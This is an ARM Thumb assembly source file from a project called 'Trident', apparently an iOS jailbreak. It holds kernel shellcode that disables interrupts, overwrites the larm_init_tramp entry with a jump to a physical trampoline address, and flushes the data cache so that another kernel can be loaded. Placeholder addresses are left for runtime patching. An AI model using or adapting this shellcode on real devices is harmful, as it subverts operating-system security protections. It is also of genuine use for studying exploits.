//
//  kloader_asm.s
//  Trident
//
//  Created by Ashleigh Hopkins on 02/01/2017.
//  Copyright © 2017 Benjamin Randazzo. All rights reserved.
//
    .code 16
    .thumb_func
    .align 2
    .data
    .globl _shellcode_begin
    .globl _shellcode_end
    .globl _larm_init_tramp
    .globl _flush_dcache
    .globl _invalidate_icache
    .globl _kern_tramp_phys
    .globl _kern_base
_shellcode_begin:
    mrs r12, cpsr
    cpsid   if
    ldr r0, 0f
    ldr r1, _kern_tramp_phys
    ldr r2, _larm_init_tramp
    str r0, [r2]
    str r1, [r2, #4]
    ldr r0, _kern_base
    @ Clear cache to PoC
    ldr r2, _larm_init_tramp
    bic r2, r2, #((1 << 6) - 1)
    mcr p15, 0, r2, c7, c14, 1
    mov r1, #256
.Lloop:
    add r2, r2, #(1 << 6)
    mcr p15, 0, r2, c7, c14, 1
    subs    r1, r1, #1
    bne .Lloop
    msr cpsr_c, r12
    movs    r0, #0
    bx  lr
    .align 2
0:  .long   0xe51ff004
    _kern_tramp_phys:   .long   0x9bf00000
    _kern_base:         .long   0xdeadbeef
    _larm_init_tramp:   .long   0xdeadbeef
    _flush_dcache:      .long   0xdeadbeef
    _invalidate_icache: .long   0xdeadbeef
    _shellcode_end:
    mov r8, r8
